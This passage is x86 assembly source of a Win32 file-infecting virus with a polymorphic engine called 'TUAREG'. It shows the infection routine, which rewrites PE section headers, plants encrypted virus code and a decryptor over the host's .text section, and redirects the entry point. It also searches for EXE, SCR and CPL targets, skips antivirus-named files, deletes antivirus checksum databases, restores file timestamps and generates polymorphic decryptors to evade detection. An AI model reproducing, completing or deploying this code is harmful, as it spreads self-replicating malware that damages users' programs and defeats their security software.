;;   header has enough empty space to do it. If not, we end infection. When
;;   we create that section, we set it as if it were an anulated .reloc.
;; 2) We check if the last is quite big to contain the virus. If not, we make
;;   it bigger.
;; 4) We copy the virus to the last and we change the name of the section by
;;   another randomly generated
;; 3) We copy from .text to the end of the last section (after the virus) the
;;   portion of code that is going to be overwritten. Both virus and this data
;;   are copied already encrypted.
;; 5) We overwrite .text section with the decryptor (we check if .text is big
;;   enough to contain this).
;; 6) When execution, .text must be restored from the saved data.

                movzx   ebx, word ptr [esi+14h] ; Size of this header
                movzx   ecx, word ptr [esi+06h] ; Number of sections
                mov     word ptr [ebp+Sav_NumberOfSections], cx
                lea     ebx, [ebx+esi+18h]  ; EBX=Address of the first section
                mov     eax, 28h      ; EAX = Size of one section header
                push    ebx
                push    ecx
                dec     ecx
                mul     ecx
                add     ebx, eax      ; EBX=Address of last section
                sub     ebx, edi     ; EBX=Physical address in the mapped file
                mov     [ebp+LastHeader], ebx ; Save it here
                pop     ecx          ; Restore some values (new EAX=old EBX)
                pop     eax          ; EAX=Address of first section header
                mov     dword ptr [ebp+TextHeader], 0  ; Set to 0 to know if
                mov     dword ptr [ebp+RelocHeader], 0 ; this values has been
                mov     dword ptr [ebp+BssSection], 0  ; found when we end the
                                                       ; loop
                push    edi
                push    ecx
                push    eax
                lea     edi, [ebp+SectionNames]
                mov     ecx, 30h / 4
                xor     eax, eax
                rep     stosd
                pop     eax
                pop     ecx
                pop     edi

   @@Loop_001:  cmp     dword ptr [eax], 'xet.'  ; Does it begin like .text?
                jnz   @@LookForReloc             ; If not, do next check
                cmp     dword ptr [eax+4], 0+'t' ; .text?
                jnz   @@NextSection              ; If not, look next section
                mov     byte ptr [ebp+SectionNames+0], 1
                sub     eax, edi
                mov     [ebp+TextHeader], eax ; Physical address of .text
                add     eax, edi              ; Restore address
                jmp   @@NextSection2          ; Look next section
@@LookForReloc: cmp     dword ptr [eax], 'ler.'  ; Does it begin like .reloc?
                jnz   @@LookForBss               ; If not, do next check
                cmp     dword ptr [eax+4], 0+'co' ; .reloc?
                jnz   @@NextSection              ; If not, look next section
                sub     eax, edi
                mov     [ebp+RelocHeader], eax ; Physical address of .reloc
                add     eax, edi
                jmp   @@NextSection2          ; Look next section
@@LookForBss:   cmp     dword ptr [eax], 'ssb.'  ; Does it begin like .bss?
                jnz   @@LookForIdata             ; If not, do next check
                cmp     dword ptr [eax+4], 0     ; .bss?
                jnz   @@NextSection              ; If not, look next section
                mov     byte ptr [ebp+SectionNames+1], 1
                push    eax
                mov     eax, [eax+0Ch]       ; Save the RVA of the section for
                add     eax, [esi+34h]       ; later use in the poly engine.
                mov     [ebp+BssSection], eax
                pop     eax
                jmp   @@NextSection2          ; Look next section
@@LookForIdata: cmp     dword ptr [eax], 'adi.'  ; Does it begin like .idata?
                jnz   @@NextSection              ; If not, do next check
                cmp     dword ptr [eax+4], 0+'at' ; .idata?
                jnz   @@NextSection              ; If not, look next section
                or      byte ptr [eax+24h+3], 80h ;make it writable (Win98 SE)
             ;   jmp   @@NextSection               ; If not, per-process fails
@@NextSection:  pushad
                mov     edi, eax
                xor     edx, edx
                lea     esi, [ebp+SZSectionNames]
        @@LoopNS_001:
                push    edi
                push    esi
                xor     ecx, ecx
        @@LoopNS_002:
                cmpsb
                jnz   @@NextNS_001
                inc     ecx
                cmp     ecx, 8
                jnz   @@LoopNS_002
                mov     byte ptr [ebp+edx+SectionNames], 1
                pop     esi
                pop     edi
                jmp   @@NextNS_002
        @@NextNS_001:
                pop     esi
                pop     edi
                add     esi, 8
                inc     edx
                cmp     byte ptr [esi], 0
                jnz   @@LoopNS_001
        @@NextNS_002:
                popad

@@NextSection2: add     eax, 28h             ; Next section
                dec     ecx
                jnz   @@Loop_001             ; Repeat it for every section
                cmp     [ebp+TextHeader], ecx ; 0? ; Text header found?
                jz    @@End4                       ; If not, end infection
                mov     ebx, [ebp+RelocHeader]
                or      ebx, ebx                   ; Is there .reloc section?
                jz    @@CreateNew             ; If not, create a new section
                cmp     ebx, [ebp+LastHeader] ; Is the last section the reloc?
                jnz   @@End4                  ; If it isn't, exit
                mov     dword ptr [esi+0A0h], 0
                mov     dword ptr [esi+0A4h], 0 ; Anulate the fixup directory
                jmp   @@ContinueWithReloc
  @@CreateNew:  mov     ebx, [ebp+LastHeader]  ; Get the last header address
                cmp     dword ptr [ebx+edi], 'rsr.' ; Is .rsrc?
                jnz   @@End4
                cmp     dword ptr [ebx+edi+4], 0+'c'
                jnz    @@End4                  ; If it isn't, end infection
                mov     byte ptr [ebp+SectionNames+2], 1
                mov     ebx, [ebp+LastHeader]
                add     ebx, edi              ; Get the last header address
                lea     ecx, [ebx+28h]        ; Get the new section address
                xor     eax, eax
      @@LoopCheckIfHole:
                cmp     dword ptr [ecx+eax], 0 ; Check if all that space is 0
                jnz   @@End4         ; If not, there isn't space for creating
                add     eax, 4       ; a new section. We check it in all the
                cmp     eax, 28h     ; 40 bytes of required space.
                jb    @@LoopCheckIfHole

               ; mov     byte ptr [ecx], '.' ; Set the '.' of the name
                mov     dword ptr [ecx+08h], Virus_SizePOW2 ; The virtual size
                                                        ; will be the required
                mov     eax, [ebx+08h]   ; The physical address of the section
                xor     edx, edx         ; will be the physical address of the
                push    ecx              ; (before) last section plus its vir-
                mov     ecx, [esi+38h]   ; tual size rounded to the section 
                div     ecx              ; physical alignment.
                inc     eax
                mul     ecx
                pop     ecx
                add     eax, [ebx+0Ch]
                mov     dword ptr [ecx+0Ch], eax ; Set that address
                mov     dword ptr [ecx+10h], 0   ; Set its physical size to
                                               ; 0 to force its readjustement
                mov     eax, [ebx+14h]    ; The RVA of the new section will be
                add     eax, [ebx+10h]    ; the RVA of the last plus its vir-
                mov     dword ptr [ecx+14h], eax  ; tual size.
                mov     dword ptr [ecx+24h], 0A0000020h ; READABLE/WRITABLE/
                                                        ; /EXECUTABLE
                sub     ecx, edi          ; Get the mapping address of this
                                          ; section
                mov     [ebp+RelocHeader], ecx ; Save it here
                inc     word ptr [esi+06h]    ;Increase the number of sections
  @@ContinueWithReloc:
                mov     eax, [esi+28h]    ; Get the initial RVA of the EXE
                mov     ebx, [esi+34h]
                add     eax, ebx          ; Add the base address...
                mov     [ebp+InicIP], eax ; ...and save it
                mov     [ebp+ImageBase], ebx ; Save the base address, too

                mov     eax, [ebp+TextHeader] ; Get the mapped address of the
                add     eax, edi              ; .text header in the file
    ; Check if it's big enough to hold a decryptor (physically and virtually)
                cmp     dword ptr [eax+08h], Host_Data_Size
                jae   @@OK_WithtextSize
                cmp     dword ptr [eax+10h], Host_Data_Size
                jae   @@OK_WithtextSize
      @@P_End5: mov     ax, word ptr [ebp+Sav_NumberOfSections]
                mov     word ptr [esi+06h], ax
                jmp   @@End4
     @@OK_WithtextSize:
                mov     ebx, [eax+0Ch]    ; EBX=Virtual address of .text
                mov     eax, [ebp+RelocHeader]
                add     eax, edi
                mov     eax, [eax+0Ch]    ; EAX=Virtual address of last sect.
                lea     ecx, [ebx+Host_Data_Size] ; ECX=Maximum address where
                                                  ; the decryptor can reach
                mov     edx, 78h    ; EDX=Address inside the PE header where
                                    ; the directories start
   ;; Now we are going to check if any directory would be inside the decryp-
   ;; tor and then overwritting the code when automatic data like import RVAs
   ;; and all that are set by the kernel.
     @@LoopDirCheck:
                cmp     dword ptr [esi+edx], ebx ;Check begin address of .text
                jb    @@NextDirCheck             ; If below, then it's OK
                cmp     dword ptr [esi+edx], ecx ; Check max address in .text
                jb    @@P_End5                   ; If below, it overwrites the
                                                 ; decryptor, so finish
                cmp     dword ptr [esi+edx], eax ; Check RVA of last section
                jae   @@P_End5    ; If it overwrites the encrypted data, end
     @@NextDirCheck:
                add     edx, 8            ; Next directory
                cmp     edx,0C8h          ; End of directories?
                jb    @@LoopDirCheck      ; If not, loop again

                mov     eax, [ebp+RelocHeader]
                add     eax, edi   ; Get mapped address of last section header
                mov     ebx, Virus_SizePOW2  ; If the virtual size isn't big
                cmp     dword ptr [eax+08h], ebx ; enough, make it bigger
                jae   @@SizeIsOK_1
                mov     dword ptr [eax+08h], Virus_SizePOW2
  @@SizeIsOK_1: mov     ebx, [eax+0Ch]  ; Calculate new virtual total size
                add     ebx, [eax+08h]
              ;  add     ebx, 1000h      ; Add 1000h to be sure...
              ; Removed due to heuristic alert (virtual end of last section
              ; must coincide with virtual end of whole executable).

                mov     [esi+50h], ebx  ; ...and put it on its header field

                mov     ebx, Virus_Size + Host_Data_Size  ; Check now the
                cmp     dword ptr [eax+10h], ebx          ; physical size
                jae   @@SizeIsOK_2
 @@SizeIsNotOK: sub     ebx, [eax+10h]    ; Calculate the new physical size
                mov     ecx, eax          ; of the last section and of all the
                xchg    ebx, eax          ; file. If the last section is the
                mov     ebx, [esi+38h]    ; .reloc and it's big enough to hold
                xor     edx, edx          ; the virus (Virus_Size +
                div     ebx               ; Host_Data_Size), then the file
                or      edx, edx          ; doesn't grow in size.
                jz    @@RemainderIs0
                inc     eax
    @@RemainderIs0:
                mul     ebx
                add     [ecx+10h], eax

                add     [ebp+FileSizeLow], eax
                call    UnmapFile        ; Close this mapping
                call    MapFile          ; Open a mapping with the new size
                jc    @@End3
       ; Here, the file is prepared to hold the virus
  @@SizeIsOK_2:
                mov     dword ptr [ebp+MappingAddress], eax
                mov     edi, eax
                mov     esi, [edi+3Ch]        ; This operations are made coz
                add     esi, edi              ; maybe the mapping address
                mov     [ebp+PEHeaderAddress], esi ; changed when resizing.

                mov     eax, [ebp+TextHeader]
                add     eax, edi           ; EAX=Address of .text header (map)
                mov     ebx, [eax+0Ch]     ; New entrypoint of the executable
                mov     [esi+28h], ebx     ; is the starting address of .text
                                           ; virtually
                add     ebx, [esi+34h]     ; Add the base address of exec...
                mov     [ebp+RestoreAddress], ebx ; ...and we have the virtual
                                                  ; address of text. We have
                                                  ; to restore the host here.
                mov     ebx, [eax+08h]
                mov     [ebp+SizeOfText], ebx

                mov     ecx, [eax+14h]  ; Get the physical address of the
                add     ecx, edi        ; section in ECX

                                             
                mov     eax, [ebp+RelocHeader]
                add     eax, edi        ; EAX=Phys. address of last sec. head.
                or      dword ptr [eax+24h], 0A0000020h ; Make it EXECUTABLE/
                                                        ; /WRITABLE/READABLE

                call    ConstructNameForReloc

                push    edi
                xchg    edi, eax    ; EAX=Mapping address
                mov     edi, [ebp+RelocHeader]
                add     edi, eax
                mov     edi, [edi+14h] ; EDI=Physical address of the last
                add     edi, eax       ; section inside the executable, now
                                       ; mapped

                call    CalculateAPIsAddresses

                push    eax
                call    Random   ; EAX=Random value, and one of the values
                mov     dword ptr [ebp+CryptValue2], eax ; the virus will be
                                                         ; crypted with

      ;; This function creates a new decryptor at the beginning of the virus,
      ;; but with a normal polymorphism level. This avoids cryptanalisis and
      ;; all that.
                call    ModifyDumbDecryptor
                pop     eax

                push    esi                 ; ESI=Virus start
                lea     esi, [ebp+Inic_Virus]
                mov     ecx, Virus_Size / 4 ; Errrmh... size in dwords, maybe?
                                            ; :)
                push    eax
                mov     byte ptr [ebp+CopyingVirus], 1 ; This controls the
                                                ; first 3Ch bytes, to check
                                                ; if we have to encrypt with
                                                ; one or two encryption keys
                                                ; (the first 3Ch bytes are the
                                                ; little decryptor)
                call    EncryptWhileStoring  ; OK, so that
                pop     eax

                mov     esi, [ebp+TextHeader]
                add     esi, [ebp+MappingAddress]
                mov     esi, [esi+14h]
                add     esi, [ebp+MappingAddress] ; ESI=Host code address
                mov     ecx, Host_Data_Size / 4
                mov     byte ptr [ebp+CopyingVirus], 0
                call    EncryptWhileStoring       ; Store the overwritten data
                                                  ; of the host encrypting it

                mov     eax, [ebp+RelocHeader]
                add     eax, [ebp+MappingAddress]
                mov     ecx, [eax+10h]
                sub     ecx, Virus_Size + Host_Data_Size
                or      ecx, ecx
                jz    @@JumpFillSection_002
                call    Random
                and     eax, 01FFh
                cmp     eax, ecx
                jbe   @@JumpFillSection_001
                mov     eax, ecx
     @@JumpFillSection_001:
                sub     ecx, eax
                mov     edx, ecx
                xchg    ecx, eax
     @@LoopFillSection_001:
                call    Random
                stosb
                loop  @@LoopFillSection_001
                mov     ecx, edx
                or      ecx, ecx
                jz    @@JumpFillSection_002
                xor     al, al
                rep     stosb
     @@JumpFillSection_002:
                pop     esi
                pop     edi

                mov     eax, [ebp+TextHeader]
                add     eax, edi
                mov     ebx, [eax+0Ch]
                add     ebx, [esi+34h]   ; EBX=Virtual address where the de-
                                         ; cryptor will be
                mov     ecx, [eax+14h]
                add     ecx, edi         ; ECX=Physical place where the de-
                                         ; cryptor will be constructed
                  
                mov     eax, [ebp+RelocHeader]
                add     eax, edi
                mov     eax, [eax+0Ch]
                add     eax, [esi+34h]
                sub     eax, ebx         ; EAX=Displacement from the decryptor
                                         ; start until the encrypted part. I
                                         ; use this to calculate the final
                                         ; jump to the decrypted part

               ; EAX=Displacement from the beginning till the virus
               ; EBX=Virtual address where the decryptors will be
               ; ECX=Place where the decryptors must be put
               ; Size of encrypted part is always Virus_SizePOW2

                ; int 3
                call    Tuareg      ; Call this amazing engine! :)

                mov     eax, [ebp+EPAddition]
                add     [esi+28h], eax

            ; Let's calculate the checksum for the header address (if it's
            ; different from 0)

                cmp     dword ptr [ebp+RVA_CheckSumMappedFile], 0
                jz    @@End4
                mov     eax, [esi+58h]
                or      eax, eax
                jz    @@End4
                lea     eax, [esi+58h]
                push    eax
                lea     eax, [ebp+TextHeader] ; Buffer variable
                push    eax
                push    dword ptr [ebp+FileSizeLow]
                push    dword ptr [ebp+MappingAddress]
                call    dword ptr [ebp+RVA_CheckSumMappedFile]

       @@End4:  call    UnmapFile       ; Believe me, you'll miss these faci-
       @@End3:  call    RestoreDateTime ; lities to understand the code when
                                        ; you look the code of TUAREG :P
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_CloseHandle] ; Close file

       @@End2:  push    dword ptr [ebp+FileAttributes]
                lea     ebx, [ebp+FileName]
                push    ebx                        ; Restore file attributes
                call    dword ptr [ebp+RVA_SetFileAttributesA]
       @@End:   ret                                ; Return from this
InfectFile      endp

TextHeader              dd      0      ; Some data...
RelocHeader             dd      0
LastHeader              dd      0
StartOfLastSection      dd      0
PEHeaderAddress         dd      0

CryptValue2     dd      0             ; This value is set somewhere...

Sav_NumberOfSections    dw      0

SectionNames    db      30h dup (0)
SZSectionNames  db      ".text",0,0,0
                db      ".bss",0,0,0,0
                db      ".rsrc",0,0,0
                db      "INITTASK"
                db      ".pdata",0,0
                db      ".tls",0,0,0,0
                db      ".Script",0
                db      ".petite",0
                db      "INIT",0,0,0,0
                db      "WINEXEC",0
                db      ".rdata",0,0
                db      ".udata",0,0
                db      "$$DOSX",0,0
                db      ".PCPEC",0,0
                db      "PREVIEW",0
                db      ".OBJ",0,0,0,0
                db      "_winzip_"
                db      ".PATCH",0,0
                db      "$prfth",0,0
                db      "PEPACK!!"
                db      "_cabinet"
                db      "actdlvry"
                db      ".adata",0,0
                db      ".textbss"
                db      ".CPS",0,0,0,0
                db      "_mvdata",0
                db      ".check",0,0
                db      "BSS",0,0,0,0,0
                db      ".dcode",0,0
                db      ".WWP32",0,0
                db      ".mdata",0,0
                db      ".debug",0,0
                db      ".data",0,0,0
                db      "DATA",0,0,0,0
                db      ".dllent",0
                db      ".WOPEC",0,0
                db      ".PEpsi",0,0
                db      ".drectve"
                db      "Ext_Cab1"
                db      ".gdata",0,0
                db      "ANAKiN98"
                db      "_sfxrun_"
                db      ".edata",0,0
                db      ".fearzip"
                db      ".idata",0,0
                db      "CODE",0,0,0,0
                db      ".petprg",0
                db      ".delete",0
                db      0

ConstructNameForReloc proc
                pushad
    @@Loop01:   call    Random
                and     eax, 3Fh
                cmp     eax, 2Fh
                ja    @@Loop01
                cmp     byte ptr [ebp+eax+SectionNames], 1
                jz    @@Loop01
                shl     eax, 3
                mov     ecx, [ebp+RelocHeader]
                add     ecx, [ebp+MappingAddress]
                mov     ebx, dword ptr [ebp+eax+SZSectionNames]
                mov     [ecx], ebx
                mov     ebx, dword ptr [ebp+eax+SZSectionNames+4]
                mov     [ecx+4], ebx
                popad
                ret                   ; Return
ConstructNameForReloc endp

FindFileMask1   db      '*.EXE',0  ; Masks for FindFirstFile and FindNext
FindFileMask2   db      '*.SCR',0
FindFileMask3   db      '*.CPL',0

;; Oh, I know this function is only called once, but the code is more struc-
;; tured with this and more clear to me. Moreover, if I want to put more than
;; one calls to this function in the future... hey, I'll have it coded already
;; :)
OpenFile        proc
                push    0
                push    0
                push    3
                push    0
                push    0           ; ??? (I don't remember exactly why this
                push    0c0000000h  ; values and no others :)
                push    ebx      ; EBX=RVA to the file name (in FindFileField)
                call    dword ptr [ebp+RVA_CreateFileA] ; Open the file
                inc     eax
                jz    @@Error      ; If error, return carry flag
                dec     eax
                mov     dword ptr [ebp+FileHandle], eax ; Save handle...
                clc                ; ...clear carry flag...
                ret                ; ...and return
      @@Error:  stc
                ret
OpenFile        endp

;; This function opens a mapping over the file represented in FindFileField.
;; The data there is used here (well, file size only, but I save a lot of
;; work if I use it in this manner)
MapFile         proc
                push    0
                push    dword ptr [ebp+FileSizeLow]
                push    0
                push    4
                push    0
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_CreateFileMappingA]
                or      eax, eax
                jz    @@FinError  ; If error, exit
                mov     dword ptr [ebp+MappingHandle], eax
                push    dword ptr [ebp+FileSizeLow]
                push    0
                push    0
                push    2
                push    dword ptr [ebp+MappingHandle] ; Open mapping
                call    dword ptr [ebp+RVA_MapViewOfFile]
                or      eax, eax         ; If error, exit
                jz    @@FinError2
                mov     dword ptr [ebp+MappingAddress], eax ; Save mapping
                clc                             ; RVA here, clear carry flag
                ret                             ; and return
@@FinError2:    push    dword ptr [ebp+MappingHandle]  ;If error, close handle
                call    dword ptr [ebp+RVA_CloseHandle] ;of file mapping, set
@@FinError:     stc                                     ; carry flag and exit.
                ret
MapFile         endp

MappingHandle   dd      0   ; Variables
MappingAddress  dd      0
FileHandle      dd      0

;; This function, although it seems false, unmaps a previous mapping of a
;; file :P
UnmapFile       proc
                push    dword ptr [ebp+MappingAddress]
                call    dword ptr [ebp+RVA_UnmapViewOfFile]
                push    dword ptr [ebp+MappingHandle]
                call    dword ptr [ebp+RVA_CloseHandle]
                ret
UnmapFile       endp

;; This function checks a file name to determine if it's a "dangerous" file
;; if infected or we can infect it without problems (theorically). It checks
;; the file name to see if it begins with TB (Thunderbyte appz), SC (Scan and
;; others, normally McCafÇ one), F- (F-Potatoe), PA (Panda Antivirus), DR
;; (DrWeb) and NO (Nod-Ice), or it has a "V" in any position (it's usual for
;; an antivirus to have a "V" in the name, like AVP, DSAV, etc.)
CheckFileName   proc
                push    ebx
                push    edx
                lea     esi, [ebp+FileName]
                mov     ebx, esi
                dec     ebx
    @@Loop_001: lodsb
                or      al, al
                jnz   @@Loop_001
                std
                dec     esi
                dec     esi
    @@Loop_002: lodsb
                cmp     al, '\'
                jz    @@EndName2
                cmp     al, ':'
                jz    @@EndName2
                cmp     esi, ebx
                jnz   @@Loop_002
                jmp   @@EndName
    @@EndName2: inc     esi
    @@EndName:  cld            ; Here we have the file name without path
                inc     esi
                lodsw          ; Read the two first letters
                movzx   edx, ax
                call    ToLower  ; Convert them to lowercase
                cmp     edx, 0+'bt'
                jz    @@Error
                cmp     edx, 0+'cs'
                jz    @@Error
                cmp     edx, 0+'-f'
                jz    @@Error
                cmp     edx, 0+'ap'
                jz    @@Error
                cmp     edx, 0+'rd'
                jz    @@Error
                cmp     edx, 0+'on' ; Any antivirus?
                jz    @@Error       ; If it is, then jump to set carry flag
                dec     esi
                dec     esi
                dec     esi
     @@Again:   inc     esi         ; Check "V"s in the name
                cmp     byte ptr [esi], 'v'
                jz    @@Error
                cmp     byte ptr [esi], 'V'
                jz    @@Error           ; If any, set carry
                cmp     byte ptr [esi], 0
                jnz   @@Again
                mov     edx, [esi-4]
                call    ToLower
                cmp     edx, 'exe.'   ; Check if the file is .EXE, .SCR or
                jz    @@ItsOK         ; .CPL. This is made because the per-
                cmp     edx, 'rcs.'   ; process functions have no mask to
                jnz   @@Error         ; search.
                cmp     eax, 'lpc.'
                jnz   @@Error
      @@ItsOK:  pop     edx
                pop     ebx
                clc
                ret
      @@Error:  pop     edx
                pop     ebx
                stc
                ret
CheckFileName   endp

;; Function to convert the four character string in EDX to lowercase
ToLower         proc
                push    ecx
                mov     ecx, 4
    @@Loop_001: cmp     dl, 'A'
                jb    @@Next
                cmp     dl, 'Z'
                ja    @@Next
                add     dl, 20h
      @@Next:   rol     edx, 8
                loop  @@Loop_001
                pop     ecx
                ret
ToLower         endp

;; This function deletes the files AVP.CRC, ANTI-VIR.DAT, CHKLIST.MS and
;; IVB.NTZ, which are antivirus CRC databases.
DeleteDATs      proc
                lea     ebx, [ebp+FileDAT1]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT2]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT3]
                call    DeleteFile
                lea     ebx, [ebp+FileDAT4]
                call    DeleteFile
                ret
DeleteDATs      endp

;; Function to delete the file pointed by EBX
DeleteFile      proc
                push    80h
                push    ebx
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                push    ebx
                call    dword ptr [ebp+RVA_DeleteFileA]
                ret
DeleteFile      endp

FileDAT1        db      'AVP.CRC',0
FileDAT2        db      'ANTI-VIR.DAT',0
FileDAT3        db      'CHKLIST.MS',0
FileDAT4        db      'IVB.NTZ',0

;; Function to save the timestamp of a file...
SaveDateTime    proc
                xor     eax, eax
                jmp     FileDateTime_Common
SaveDateTime    endp

;; ... and later restore it with this other function
RestoreDateTime proc
                mov     eax, 4
   FileDateTime_Common:
                lea     ebx, [ebp+FileTime]
                push    ebx
                add     ebx, 8
                push    ebx
                add     ebx, 8
                push    ebx
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+eax+RVA_GetFileTime]
                                ; EAX = 0: GetFileTime
                                ; EAX = 4: SetFileTime
                ret
RestoreDateTime endp

;; If we are in Win2K, some files are protected by the operating system. Since
;; they aren't all the files in the harddisk (only the system ones), we only
;; have to check if a file is protected or not. For that thing that I do in
;; InfectFile, we need to load SFC.DLL, which have the protection APIs. If we
;; can't load that, then we aren't in Win2K, so we put 0 in the RVA-storage
;; variable to know that the function can't be called. Normally, under Win2K
;; this DLL is loaded always (like ADVAPI32.DLL), so we'll get the module
;; handle as if we call GetModuleHandleA. If not, then we load it :)
LoadSFCFunctions proc
                lea     eax, [ebp+SFC_Dll]
                push    eax
                call    dword ptr [ebp+RVA_LoadLibraryA]
                mov     dword ptr [ebp+HandleSFC], eax
                or      eax, eax
                jz    @@EndOfSFCs
                lea     ebx, [ebp+ASC_SfcIsFileProtected]
                push    ebx
                push    eax
                call    dword ptr [ebp+RVA_GetProcAddress]
       @@EndOfSFCs:                                                
                mov     dword ptr [ebp+RVA_SfcIsFileProtected], eax ; 0 or
                ret                                                 ; address
LoadSFCFunctions endp

SFC_Dll db      'SFC.DLL',0
HandleSFC       dd      0
ASC_SfcIsFileProtected db       'SfcIsFileProtected',0 ; The only function we
RVA_SfcIsFileProtected dd       0                      ; need

LoadIMAGEHLPFunctions proc
                lea     eax, [ebp+IMAGEHLP_Dll]
                push    eax
                call    dword ptr [ebp+RVA_LoadLibraryA]
                mov     dword ptr [ebp+HandleIMAGEHLP], eax
                or      eax, eax
                jz    @@EndOfIMAGEHLPs
                lea     ebx, [ebp+ASC_CheckSumMappedFile]
                push    ebx
                push    eax
                call    dword ptr [ebp+RVA_GetProcAddress]
       @@EndOfIMAGEHLPs:
                mov     dword ptr [ebp+RVA_CheckSumMappedFile], eax
                ret
LoadIMAGEHLPFunctions endp

IMAGEHLP_Dll db 'IMAGEHLP.DLL',0
HandleIMAGEHLP  dd      0
ASC_CheckSumMappedFile  db      'CheckSumMappedFile',0
RVA_CheckSumMappedFile  dd      0

;;; This function creates a decryptor that fills the 40 free bytes at the be-
;;; ginning of the virus. That (shitty polymorphic) decryptor is made to avoid
;;; cryptanalisis. Moreover, this function gets some values for the later use
;;; of the TUAREG.
ModifyDumbDecryptor proc
                pushad
   @@AgainRnd:  call    Random
                or      eax, eax
                jz    @@AgainRnd
                mov     [ebp+DecryptKey], eax ; Get the decryption key for the
                                              ; main encryption (TUAREG)
   @@AgainRnd2: call    Random
                and     al, 3
                jz    @@AgainRnd2
                dec     al
                mov     byte ptr [ebp+EncryptType], al ; Get method: 0=ADD,
                                                       ; 1=SUB, 2=XOR
                lea     edi, [ebp+Inic_Virus]
     ;; Let's use the TUAREG functions
                mov     dword ptr [ebp+Index1Register], 08080808h
                call    SelectARegister
                mov     [ebp+Index1Register], al
                call    SelectARegister
                mov     [ebp+Index2Register], al
                call    SelectARegister
                mov     [ebp+KeyRegister], al
                lea     ebx, [ebp+@@SetIndex]
                lea     ecx, [ebp+@@SetCounter]
                lea     edx, [ebp+@@SetKey]
                lea     esi, [ebp+@@Garbage]
                call    RandomCalling
                mov     esi, edi
   @@GetOtherType:
                call    Random
                and     eax, 3
                jz    @@GetOtherType
                dec     eax
                mov     [ebp+EncryptType2], al
                cmp     al, 1
                jb    @@PutSUB
                jz    @@PutADD
      @@PutXOR: mov     al, 0031h
                jmp   @@Next01
      @@PutADD: mov     al, 0001h
                jmp   @@Next01
      @@PutSUB: mov     al, 0029h
      @@Next01: mov     ah, [ebp+KeyRegister]
                shl     ah, 3
                or      ah, [ebp+Index1Register]
                cmp     byte ptr [ebp+Index1Register], 5
                jnz   @@Next02
                or      ah, 40h
                stosw
                xor     al, al
                stosb
                jmp   @@Next03
      @@Next02: stosw
      @@Next03: call  @@Garbage
                push    esi
                lea     ebx, [ebp+@@ModifyKey]
                lea     ecx, [ebp+@@ModifyIndex]
                lea     edx, [ebp+@@Garbage]
                lea     esi, [ebp+@@Ret]
                call    RandomCalling
                pop     esi

      @@Repeat: call    Random
                and     al, 3
                jz    @@Repeat
                cmp     al, 2
                jb    @@DecCounter
                jz    @@SubCounter
  @@AddCounter: mov     ax, 0C083h
                or      ah, [ebp+Index2Register]
                stosw
                mov     al, 0FFh
                stosb
                jmp   @@Next04
  @@SubCounter: mov     ax, 0E883h
                or      ah, [ebp+Index2Register]
                stosw
                mov     al, 1
                stosb
                jmp   @@Next04
  @@DecCounter: mov     al, 48h
                add     al, [ebp+Index2Register]
                stosb
     @@Next04:  call    RandomFlags
                jz    @@DoLongJNZ
                mov     al, 75h
                stosb
                inc     edi
                mov     eax, esi
                sub     eax, edi
                mov     [edi-1], al
                jmp   @@Next05
   @@DoLongJNZ: mov     ax, 850Fh
                stosw
                add     edi, 4
                mov     eax, esi
                sub     eax, edi
                mov     [edi-4], eax
   @@Next05:    lea     esi, [ebp+InicDecryptVirus]
                mov     dword ptr [ebp+Index1Register], 08080808h
   @@Next06:    cmp     edi, esi
                jz    @@Made
                call  @@Garbage2
                jmp   @@Next06
    @@Made:     popad
    @@Ret:      ret                 ; Return

@@ModifyKey:    call    Random
                and     al, 3
                mov     byte ptr [ebp+KeyModification], al
                jz    @@ModADD
                cmp     al, 2
                jb    @@ModSUB
                jz    @@ModXOR
     @@ModROL:  mov     ax, 0C0D1h
                or      ah, byte ptr [ebp+KeyRegister]
                stosw
                call  @@Garbage
                ret
     @@ModADD:  mov     ax, 0C081h
                jmp   @@ModNext
     @@ModSUB:  mov     ax, 0E881h
                jmp   @@ModNext
     @@ModXOR:  mov     ax, 0F081h
     @@ModNext: or      ah, byte ptr [ebp+KeyRegister]
                stosw
                call    Random
                mov     [ebp+KeyModifier], eax
                stosd
                call  @@Garbage
                ret

@@ModifyIndex:  call    RandomFlags
                jz    @@Add4
       @@Lea4:  mov     al, 8Dh
                mov     ah, [ebp+Index1Register]
                shl     ah, 3
                or      ah, [ebp+Index1Register]
                or      ah, 40h
       @@StoreAddition:
                stosw
                mov     al, 4
                stosb
                call  @@Garbage
                ret
       @@Add4:  mov     ax, 0C083h
                or      ah, [ebp+Index1Register]
                jmp   @@StoreAddition

@@SetIndex:     mov     ebx, [ebp+RelocHeader]
                add     ebx, [ebp+MappingAddress]
                mov     ebx, [ebx+0Ch]
                mov     esi, [ebp+PEHeaderAddress]
                add     ebx, [esi+34h]
                add     ebx, 3Ch
                mov     dl, [ebp+Index1Register]
                call  @@DoMOV
                call  @@Garbage
                ret

@@SetCounter:   call    Random
                and     eax, 7Fh
                cmp     eax, 78h
                ja    @@SetCounter
                sub     eax, (offset End_Virus - offset InicDecryptVirus) / 4
                neg     eax
                mov     ebx, eax
                mov     dl, [ebp+Index2Register]
                call  @@DoMOV
                call  @@Garbage
                ret

@@SetKey:       mov     ebx, [ebp+CryptValue2]
                mov     dl, [ebp+KeyRegister]
                call  @@DoMOV
                call  @@Garbage
                ret

@@DoMOV:        call    Random
                and     al, 3
                jz    @@DoPureMOV2
                cmp     al, 2
                jb    @@DoPureMOV
                jz    @@DoPUSHPOP
     @@DoLEA:   mov     ax, 058Dh
                shl     dl, 3
                or      ah, dl
                stosw
  @@StoreValue: mov     eax, ebx
                stosd
                ret
   @@DoPureMOV: mov     al, 0B8h
                add     al, dl
                stosb
                jmp   @@StoreValue
  @@DoPureMOV2: mov     ax, 0C0C7h
                add     ah, dl
                stosw
                jmp   @@StoreValue
   @@DoPUSHPOP: mov     al, 68h
                stosb
                mov     eax, ebx
                stosd
                call  @@Garbage
                mov     al, 58h
                add     al, dl
                stosb
                ret

@@Garbage2:     pushad
                call    Random
                and     al, 3
                jz    @@OneByteWithoutRegister
                cmp     al, 2
                jb    @@OneByteWithRegister
                jz    @@TwoBytes2

   @@Garbage_XCHGEAX:
                call    Random
                and     al, 7
                cmp     al, 4
                jz    @@Garbage_XCHGEAX
                add     al, 90h
                stosb
                jmp   @@EndGarbage

@@Garbage:      pushad
